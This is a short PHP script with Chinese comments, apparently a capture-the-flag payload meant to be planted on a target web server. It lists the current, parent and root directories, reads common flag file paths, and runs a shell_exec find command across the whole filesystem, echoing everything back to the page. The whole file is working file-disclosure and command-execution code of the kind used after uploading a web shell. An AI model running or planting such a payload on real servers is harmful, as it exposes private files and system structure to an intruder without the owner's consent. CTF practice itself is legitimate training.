<?php
// 查找flag文件
echo "<h2>搜索flag...</h2>";

// 当前目录
echo "<h3>当前目录: " . getcwd() . "</h3>";

// 列出当前目录
echo "<h3>当前目录文件:</h3>";
$files = scandir('.');
foreach ($files as $file) {
    echo $file . "<br>";
}

// 列出上级目录
echo "<h3>上级目录文件:</h3>";
$files = scandir('..');
foreach ($files as $file) {
    echo $file . "<br>";
}

// 搜索根目录
echo "<h3>根目录文件:</h3>";
if (is_dir('/')) {
    $files = scandir('/');
    foreach ($files as $file) {
        echo $file . "<br>";
    }
}

// 尝试读取常见flag位置
$flag_paths = [
    '/flag',
    '/flag.txt',
    '../flag',
    '../flag.txt',
    '/var/www/flag',
    '/var/www/flag.txt',
    '/tmp/flag',
    '/tmp/flag.txt',
    'flag.txt',
    'flag'
];

echo "<h3>尝试读取flag:</h3>";
foreach ($flag_paths as $path) {
    if (file_exists($path)) {
        echo "找到文件: $path<br>";
        echo "内容: " . file_get_contents($path) . "<br>";
    }
}

// 执行find命令查找flag
echo "<h3>使用find命令搜索:</h3>";
$output = shell_exec('find / -name "*flag*" 2>/dev/null');
echo "<pre>$output</pre>";
?>